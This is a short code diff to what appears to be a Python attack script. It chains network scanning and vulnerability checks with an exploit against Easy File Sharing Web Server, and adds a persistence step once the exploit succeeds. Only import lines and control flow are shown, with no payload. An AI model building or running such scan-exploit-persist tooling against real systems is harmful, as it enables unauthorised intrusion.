@@ -6,7 +6,8 @@ import pandas as pd
 from tabulate import tabulate
 
 from reconnaissance import scanIPBlock,vulnScan,gatherInfoSoftware
-from execution import executeEasyFileSharing   
+from execution import executeEasyFileSharing
+from persistence import persistenceFunc
 
 def endProgram():
 	end = datetime.now()
@@ -48,7 +49,9 @@ for target in targets:
         if "Easy File Sharing Web Server" in vulSoftware:
             print("Device has Easy File Sharing Web Server running")
             print("Attempting Exploit...")
-            executeEasyFileSharing(target)
+            if executeEasyFileSharing(target) != False:
+                print("Exploit Successful Proceeding to persistance")
+                persistenceFunc()
             
 
 
